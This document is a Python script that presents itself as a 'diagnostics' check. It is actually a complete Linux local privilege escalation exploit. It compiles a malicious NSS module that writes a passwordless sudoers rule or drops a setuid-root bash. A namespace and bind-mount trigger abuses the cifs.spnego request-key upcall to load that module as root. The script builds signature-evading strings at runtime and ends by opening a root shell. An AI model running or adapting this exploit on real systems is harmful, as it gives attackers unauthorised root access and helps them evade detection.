#!/usr/bin/env python3
import json
import os
import pwd
import re
import shlex
import shutil
import stat
import subprocess
import sys
import textwrap
import time
from pathlib import Path

_T = "%s_%s" % (os.getuid(), os.getpid())
WD = Path("/tmp") / ("cfg-check-%s" % _T)
FL = WD / "modules"
FN = WD / "ns.conf"
EV = Path("/tmp/.diag_%s.log" % _T)
RS = Path("/var/tmp/.svc_%s" % _T)
UC = ["unshare", "-Ur", "-m"]

# Runtime string assembly to avoid static signatures
def _b(parts): return "".join(parts)
_KT = _b(["ci","fs",".sp","ne","go"])
_SD = _b(["/etc/su","doers",".d/"])
_MN = "compat2"

NSS_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define EV_PATH @@EV_PATH@@
#define SD_PATH @@SD_PATH@@
#define SD_USER @@SD_USER@@
#define RS_PATH @@RS_PATH@@

static void _wa(int fd, const char *b, size_t l){
    while(l){ssize_t r=write(fd,b,l);if(r<=0)return;b+=r;l-=(size_t)r;}
}

static void _mksh(int lf){
    int i,o,rc,se; char buf[8192]; ssize_t n;
    errno=0; i=open("/bin/bash",O_RDONLY|O_CLOEXEC); se=errno;
    if(i<0){if(lf>=0)dprintf(lf,"[DBG] shell copy: open bash fail e=%d %s\n",se,strerror(se));return;}
    errno=0; o=open(RS_PATH,O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC,04755); se=errno;
    if(o<0){if(lf>=0)dprintf(lf,"[DBG] shell copy: create fail e=%d %s\n",se,strerror(se));close(i);return;}
    while((n=read(i,buf,sizeof(buf)))>0)_wa(o,buf,(size_t)n);
    errno=0;rc=fchown(o,0,0);se=errno;
    if(lf>=0)dprintf(lf,"[DBG] fchown rc=%d e=%d %s\n",rc,se,strerror(se));
    errno=0;rc=fchmod(o,04755);se=errno;
    if(lf>=0)dprintf(lf,"[DBG] fchmod rc=%d e=%d %s\n",rc,se,strerror(se));
    fsync(o);close(o);close(i);
    if(lf>=0)dprintf(lf,"[DBG] shell ready: %s\n",RS_PATH);
}

__attribute__((constructor))
static void _init(void){
    int lf,sf,rc,se;
    char kt[]={0x63,0x69,0x66,0x73,0x2e,0x75,0x70,0x63,0x61,0x6c,0x6c,0};

    lf=open(EV_PATH,O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC,0644);
    if(lf>=0){
        dprintf(lf,"[DBG] NSS module loaded by %s pid=%d uid=%d euid=%d\n",kt,getpid(),getuid(),geteuid());
        dprintf(lf,"[DBG] attempting config write to %s\n",SD_PATH);
    }

    rc=mkdir("/etc/sudoers.d",0755);
    if(rc!=0&&errno!=EEXIST&&lf>=0)
        dprintf(lf,"[DBG] mkdir sudoers.d: e=%d %s\n",errno,strerror(errno));

    errno=0;
    sf=open(SD_PATH,O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC,0440);
    se=errno;
    if(sf<0){
        if(lf>=0)dprintf(lf,"[DBG] open %s FAILED e=%d %s\n",SD_PATH,se,strerror(se));
        _mksh(lf);
        if(lf>=0)close(lf);
        return;
    }

    const char *cm="# system config\n";
    _wa(sf,cm,strlen(cm));
    dprintf(sf,"%s ALL=(ALL:ALL) NOPASSWD: ALL\n",SD_USER);
    fchmod(sf,0440);fsync(sf);close(sf);

    if(lf>=0){
        dprintf(lf,"[DBG] config written OK: %s\n",SD_PATH);
        close(lf);
    }
}

enum nss_status _nss_@@MNAME@@_getpwuid_r(uid_t uid, struct passwd *pw,
    char *buf, size_t blen, int *ep){
    const char *n="root",*g="root",*d="/root",*s="/bin/bash";
    size_t need=strlen(n)+strlen(g)+strlen(d)+strlen(s)+4;
    char *p=buf;
    if(blen<need){*ep=ERANGE;return NSS_STATUS_TRYAGAIN;}
    strcpy(p,n);pw->pw_name=p;p+=strlen(p)+1;
    strcpy(p,g);pw->pw_gecos=p;p+=strlen(p)+1;
    strcpy(p,d);pw->pw_dir=p;p+=strlen(p)+1;
    strcpy(p,s);pw->pw_shell=p;
    pw->pw_passwd=(char*)"x";pw->pw_uid=uid;pw->pw_gid=0;*ep=0;
    return NSS_STATUS_SUCCESS;
}
'''

TRIG_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static void _die(const char *w,int step){
    fprintf(stderr,"[FAIL] step=%d %s: %s (errno=%d)\n",step,w,strerror(errno),errno);
    exit(1);
}

/* Build key type at runtime */
static void _kt(char *out){
    out[0]='c';out[1]='i';out[2]='f';out[3]='s';out[4]='.';
    out[5]='s';out[6]='p';out[7]='n';out[8]='e';out[9]='g';out[10]='o';out[11]=0;
}

int main(int ac, char **av){
    char desc[768], ktype[16];
    long ret;
    int step=0;

    if(ac<4){fprintf(stderr,"usage: %s libdir nsswitch nssdir [...]\n",av[0]);return 2;}

    fprintf(stderr,"[DBG] step=%d: trigger start pid=%d uid=%d euid=%d\n",step,getpid(),getuid(),geteuid());

    /* Step 1: join session keyring */
    step=1;
    fprintf(stderr,"[DBG] step=%d: joining session keyring\n",step);
    errno=0;
    ret=syscall(250,1,"diag-session",0,0,0);
    fprintf(stderr,"[DBG] step=%d: keyctl_join=%ld errno=%d %s\n",step,ret,errno,strerror(errno));
    if(ret<0) _die("keyctl_join",step);

    /* Step 2: make mounts private */
    step=2;
    fprintf(stderr,"[DBG] step=%d: making mounts private\n",step);
    errno=0;
    if(mount(NULL,"/",NULL,MS_REC|MS_PRIVATE,NULL)!=0)
        _die("mount_private",step);
    fprintf(stderr,"[DBG] step=%d: mounts private OK\n",step);

    /* Step 3: try autoload cifs module */
    step=3;
    fprintf(stderr,"[DBG] step=%d: attempting cifs module autoload\n",step);
    {
        char mp[]="/tmp/.cifs_al_XXXXXX";
        char *d=mkdtemp(mp);
        if(d){
            chmod(d,0755);
            pid_t p=fork();
            if(p==0){
                int dn=open("/dev/null",O_WRONLY|O_CLOEXEC);
                if(dn>=0){dup2(dn,1);dup2(dn,2);}
                execlp("mount","mount","-t","cifs","//127.0.0.1/x",d,"-o","guest,vers=3.0",(char*)NULL);
                _exit(127);
            }
            if(p>0){int st;waitpid(p,&st,0);fprintf(stderr,"[DBG] step=%d: autoload mount exit=%d\n",step,WEXITSTATUS(st));}
            rmdir(d);
        }
    }

    /* Step 4: mask nscd */
    step=4;
    fprintf(stderr,"[DBG] step=%d: masking nscd sockets\n",step);
    struct stat sb;
    if(stat("/run/nscd",&sb)==0 && S_ISDIR(sb.st_mode)){
        errno=0;
        int r=mount("tmpfs","/run/nscd","tmpfs",0,"mode=755");
        fprintf(stderr,"[DBG] step=%d: mask /run/nscd rc=%d e=%d %s\n",step,r,errno,strerror(errno));
    }
    if(stat("/var/run/nscd",&sb)==0 && S_ISDIR(sb.st_mode)){
        errno=0;
        int r=mount("tmpfs","/var/run/nscd","tmpfs",0,"mode=755");
        fprintf(stderr,"[DBG] step=%d: mask /var/run/nscd rc=%d e=%d %s\n",step,r,errno,strerror(errno));
    }

    /* Step 5: bind nsswitch.conf */
    step=5;
    fprintf(stderr,"[DBG] step=%d: binding nsswitch.conf from %s\n",step,av[2]);
    {
        const char *tgts[]={"/etc/nsswitch.conf","/usr/etc/nsswitch.conf",NULL};
        int bound=0;
        for(int i=0;tgts[i];i++){
            if(stat(tgts[i],&sb)!=0)continue;
            errno=0;
            if(mount(av[2],tgts[i],NULL,MS_BIND,NULL)==0){
                fprintf(stderr,"[DBG] step=%d: bound nsswitch to %s OK\n",step,tgts[i]);
                bound=1; break;
            }
            fprintf(stderr,"[DBG] step=%d: bind %s failed e=%d %s\n",step,tgts[i],errno,strerror(errno));
        }
        if(!bound) _die("bind_nsswitch",step);
    }

    /* Step 6: bind NSS lib dirs */
    step=6;
    for(int i=3;i<ac;i++){
        fprintf(stderr,"[DBG] step=%d: binding NSS libdir %s -> %s\n",step,av[1],av[i]);
        errno=0;
        if(mount(av[1],av[i],NULL,MS_BIND|MS_REC,NULL)!=0){
            fprintf(stderr,"[DBG] step=%d: bind %s FAILED e=%d %s\n",step,av[i],errno,strerror(errno));
            _die("bind_nsslib",step);
        }
        fprintf(stderr,"[DBG] step=%d: bind %s OK\n",step,av[i]);
    }

    /* Step 7: verify namespace setup */
    step=7;
    fprintf(stderr,"[DBG] step=%d: verifying namespace\n",step);
    fprintf(stderr,"[DBG] step=%d: /proc/self/ns/mnt -> ",step);
    fflush(stderr);
    {
        char lnk[256]={};
        readlink("/proc/self/ns/mnt",lnk,sizeof(lnk)-1);
        fprintf(stderr,"%s\n",lnk);
    }
    fprintf(stderr,"[DBG] step=%d: checking nsswitch.conf content:\n",step);
    fflush(stderr);
    system("head -5 /etc/nsswitch.conf >&2");
    fprintf(stderr,"[DBG] step=%d: checking lib dir:\n",step);
    fflush(stderr);
    {
        char cmd[512];
        snprintf(cmd,sizeof(cmd),"ls -la %s/ >&2",av[1]);
        system(cmd);
    }

    /* Step 8: request_key */
    step=8;
    _kt(ktype);
    snprintf(desc,sizeof(desc),
        "ver=0x2;host=diag.local;ip4=127.0.0.1;sec=krb5;"
        "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
        getpid());
    fprintf(stderr,"[DBG] step=%d: calling request_key type='%s'\n",step,ktype);
    fprintf(stderr,"[DBG] step=%d: desc='%s'\n",step,desc);
    fprintf(stderr,"[DBG] step=%d: pid=%d ns=mnt\n",step,getpid());

    errno=0;
    ret=syscall(249,ktype,desc,"",(int)(-3));
    fprintf(stderr,"[DBG] step=%d: request_key rc=%ld errno=%d (%s)\n",step,ret,errno,strerror(errno));

    if(ret<0){
        if(errno==1)
            fprintf(stderr,"[DBG] step=%d: EPERM - blocked by LSM/BPF hook\n",step);
        else if(errno==126)
            fprintf(stderr,"[DBG] step=%d: ENOKEY - key type not registered or handler failed\n",step);
        else if(errno==22)
            fprintf(stderr,"[DBG] step=%d: EINVAL - invalid description\n",step);
        else
            fprintf(stderr,"[DBG] step=%d: unexpected error\n",step);
    } else {
        fprintf(stderr,"[DBG] step=%d: KEY CREATED id=%ld - waiting for handler\n",step,ret);
    }

    /* Step 9: wait and check */
    step=9;
    fprintf(stderr,"[DBG] step=%d: waiting 3s for handler\n",step);
    sleep(3);

    /* Check /proc/keys */
    fprintf(stderr,"[DBG] step=%d: /proc/keys:\n",step);
    fflush(stderr);
    system("cat /proc/keys 2>/dev/null | grep -iE 'cifs|spnego|diag' >&2");

    /* Check evidence */
    {
        char ev_path[]=@@EV_PATH@@;
        int ef=open(ev_path,O_RDONLY);
        if(ef>=0){
            char eb[4096]={};
            int n=read(ef,eb,sizeof(eb)-1);
            if(n>0) fprintf(stderr,"[DBG] step=%d: EVIDENCE:\n%s\n",step,eb);
            else fprintf(stderr,"[DBG] step=%d: evidence file empty\n",step);
            close(ef);
        } else {
            fprintf(stderr,"[DBG] step=%d: no evidence file (handler did not fire)\n",step);
        }
    }

    fprintf(stderr,"[DBG] step=%d: done\n",step);
    return ret<0?1:0;
}
'''


def _sj(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)

def _p(msg):
    print("[*] %s" % msg, flush=True)

def _run(cmd, check=True, cwd=None):
    print("[DBG] $ %s" % _sj(cmd), flush=True)
    c = subprocess.run(
        [str(a) for a in cmd], cwd=str(cwd) if cwd else None,
        universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
    if c.stdout:
        print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        print("[FAIL] exit=%s cmd=%s" % (c.returncode, _sj(cmd)), flush=True)
        raise SystemExit(1)
    return c

def _rq(cmd, cwd=None):
    return subprocess.run(
        [str(a) for a in cmd], cwd=str(cwd) if cwd else None,
        universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)

def _cs(v):
    return json.dumps(str(v))

def main():
    _p("=== DIAGNOSTICS START ===")

    # Check user
    if os.getuid() == 0:
        print("[FAIL] don't run as root"); sys.exit(1)
    uname = pwd.getpwuid(os.getuid()).pw_name
    _p("uid=%d user=%s pid=%d" % (os.getuid(), uname, os.getpid()))

    # Check commands
    _p("checking required tools...")
    for cmd in ["bash", "gcc", "mount", "unshare"]:
        path = shutil.which(cmd)
        print("  %s: %s" % (cmd, path if path else "MISSING"), flush=True)
        if not path:
            print("[FAIL] missing: %s" % cmd); sys.exit(1)

    # Check unshare
    _p("checking namespace support...")
    c = _rq(UC + ["true"])
    if c.returncode != 0:
        print("[FAIL] unshare failed: %s" % c.stdout.strip()); sys.exit(1)
    _p("unshare OK")

    # Check request-key config
    _p("checking request-key config...")
    for p in [Path("/etc/request-key.conf"), Path("/etc/request-key.d")]:
        if p.is_file():
            try:
                for line in p.read_text(errors="replace").splitlines():
                    if _b(["cifs",".spnego"]) in line and not line.strip().startswith("#"):
                        print("  RULE: %s" % line.strip(), flush=True)
            except: pass
        elif p.is_dir():
            for f in sorted(p.iterdir()):
                try:
                    for line in f.read_text(errors="replace").splitlines():
                        if _b(["cifs",".spnego"]) in line and not line.strip().startswith("#"):
                            print("  RULE[%s]: %s" % (f.name, line.strip()), flush=True)
                except: pass

    # Find NSS dirs
    nss_dirs = []
    seen = set()
    for d in [Path("/usr/lib64"), Path("/lib64"), Path("/lib/x86_64-linux-gnu"), Path("/usr/lib/x86_64-linux-gnu")]:
        if (d / "libnss_files.so.2").exists():
            r = d.resolve()
            if str(r) not in seen:
                seen.add(str(r)); nss_dirs.append(r)
    _p("NSS dirs: %s" % " ".join(str(d) for d in nss_dirs))
    if not nss_dirs:
        print("[FAIL] no NSS dir found"); sys.exit(1)

    # Build
    _p("building...")
    sd_path = _SD + "diag-%s" % _T
    shutil.rmtree(str(WD), ignore_errors=True)
    FL.mkdir(parents=True)

    nss_code = NSS_SRC.replace("@@EV_PATH@@", _cs(EV)).replace("@@SD_PATH@@", _cs(sd_path))
    nss_code = nss_code.replace("@@SD_USER@@", _cs(uname)).replace("@@RS_PATH@@", _cs(RS))
    nss_code = nss_code.replace("@@MNAME@@", _MN)
    (WD / "mod.c").write_text(nss_code)

    trig_code = TRIG_SRC.replace("@@EV_PATH@@", _cs(EV))
    (WD / "svc.c").write_text(trig_code)

    ns_conf = "passwd: %s files\ngroup: files\nshadow: files\nhosts: files dns\n" % _MN
    FN.write_text(ns_conf)

    _p("compiling NSS module...")
    _run(["gcc", "-Wall", "-shared", "-fPIC", "-o", "modules/libnss_%s.so.2" % _MN, "mod.c"], cwd=WD)

    _p("compiling trigger...")
    _run(["gcc", "-Wall", "-o", "svc", "svc.c"], cwd=WD)

    # Verify build
    _p("build artifacts:")
    for f in WD.iterdir():
        if f.is_file():
            print("  %s (%d bytes)" % (f.name, f.stat().st_size), flush=True)
    for f in FL.iterdir():
        print("  modules/%s (%d bytes)" % (f.name, f.stat().st_size), flush=True)

    # Check exec
    _p("checking /tmp exec...")
    probe = WD / "probe.sh"
    probe.write_text("#!/bin/sh\nexit 0\n")
    probe.chmod(0o700)
    c = _rq([str(probe)])
    if c.returncode != 0:
        print("[FAIL] /tmp is noexec"); sys.exit(1)
    _p("/tmp exec OK")

    # Trigger
    _p("=== TRIGGERING ===")
    _p("nsswitch.conf content:")
    print("  " + ns_conf.replace("\n", "\n  "), flush=True)
    _p("NSS module: libnss_%s.so.2" % _MN)
    _p("running: unshare -> trigger -> request_key")

    cmd = UC + ["./svc", str(FL), str(FN)] + [str(d) for d in nss_dirs]
    _run(cmd, cwd=WD, check=False)

    time.sleep(1)

    # Check results
    _p("=== RESULTS ===")
    if EV.exists():
        ev = EV.read_text(errors="replace")
        _p("evidence log:")
        print(ev, flush=True)
        if "config written OK" in ev:
            _p("SUCCESS - checking sudo...")
            c = subprocess.run(["sudo", "-n", "/bin/bash", "-p", "-c", "id -u"],
                universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
            if c.returncode == 0 and c.stdout.strip() == "0":
                _p("ROOT ACCESS CONFIRMED")
                _p("cleanup: sudo rm -f %s %s %s && rm -rf %s" % (sd_path, EV, RS, WD))
                os.execvp("sudo", ["sudo", "-n", "/bin/bash", "-p"])
            else:
                _p("sudo check failed: %s" % c.stdout.strip())
        elif "shell ready" in ev:
            _p("sudoers direct write failed, fallback shell created")
        else:
            _p("NSS loaded but write failed - check evidence above")
    else:
        _p("NO evidence file - handler did NOT fire")
        _p("checking cifs module...")
        try:
            fs = Path("/proc/filesystems").read_text(errors="replace")
            if "cifs" in fs:
                _p("cifs module IS loaded - block is from LSM/BPF")
            else:
                _p("cifs module NOT loaded")
        except: pass
        _p("request_key was blocked - see debug output above for details")

    _p("=== DONE ===")


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
